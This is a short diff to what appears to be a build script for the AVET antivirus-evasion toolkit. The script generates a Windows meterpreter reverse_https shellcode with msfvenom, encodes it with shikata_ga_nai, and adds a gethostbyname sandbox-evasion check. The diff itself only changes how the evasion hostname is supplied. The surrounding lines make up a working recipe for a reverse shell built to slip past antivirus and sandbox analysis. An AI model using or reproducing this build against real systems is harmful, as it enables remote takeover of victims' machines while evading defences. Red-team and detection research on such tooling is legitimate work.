@@ -22,10 +22,8 @@ LHOST=$GLOBAL_LHOST
 # generate payload and call avet
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
-# set define to specify which hostname is attempted to be resolved
-printf "\n#define HOSTVALUE \"this.that\"\n" >> source/evasion/evasion.include
 # add gethostbyname sandbox evasion
-add_evasion gethostbyname_sandbox_evasion
+add_evasion gethostbyname_sandbox_evasion 'this.that'
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
